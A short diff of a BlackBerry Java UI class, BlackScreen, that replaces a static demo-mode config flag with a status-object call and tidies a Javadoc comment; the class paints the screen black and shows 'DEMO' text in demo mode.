@@ -7,12 +7,13 @@ import net.rim.device.api.ui.Graphics;
 import net.rim.device.api.ui.UiApplication;
 import net.rim.device.api.ui.container.MainScreen;
 import blackberry.Main;
-import blackberry.config.Conf;
+import blackberry.Status;
 
 /**
  * Vedi anche ScreenFake
+ * 
  * @author zeno
- *
+ * 
  */
 public class BlackScreen extends MainScreen {
 
@@ -49,7 +50,7 @@ public class BlackScreen extends MainScreen {
         g.fillRect(0, 0, width, height);
 
         g.setColor(0xFFFFFF);
-        if (Conf.DEMO) {
+        if (Status.self().isDemo()) {
             g.drawText("DEMO", 30, height / 2);
         }
     }
